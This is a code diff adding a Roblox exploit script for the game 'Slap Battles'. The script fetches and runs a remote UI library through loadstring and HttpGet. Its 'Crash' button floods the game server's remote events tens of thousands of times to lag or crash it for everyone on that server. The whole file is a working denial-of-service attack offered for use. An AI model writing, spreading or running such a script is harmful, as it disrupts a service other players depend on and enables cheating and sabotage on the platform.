@@ -1,0 +1,37 @@
+if game.PlaceId == 6403373529 then
+    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+    local Window = Library.CreateLib("Slap Battles Crasher (BY SKM364)", "Ocean")
+
+
+---------------------------------------////||||||| [M <> A <> I <> N] ||||||\\\\-------------------------------------------->>>>>>>>>>>>>>>
+local Main = Window:NewTab("Crasher")
+local MainSection = Main:NewSection("Crasher")
+MainSection:NewButton("Crash (UNLOCK DIAMOND FOR MORE LAG)", "Crashes The Game.", function(v)
+	for i=1,1000 do
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	game.ReplicatedStorage.ErrorDeath:FireServer();
+	end
+
+	fireclickdetector(game:GetService("Workspace").Lobby.DiamondGlove.ClickDetector)
+	local args = {
+		[1] = game:GetService("Players").LocalPlayer.Character,
+		[2] = false
+	}
+	for i=1,50000 do
+		game:GetService("ReplicatedStorage").HumanoidDied:FireServer(unpack(args))
+		game:GetService("ReplicatedStorage").Rockmode:FireServer()
+		end
+end)
+end
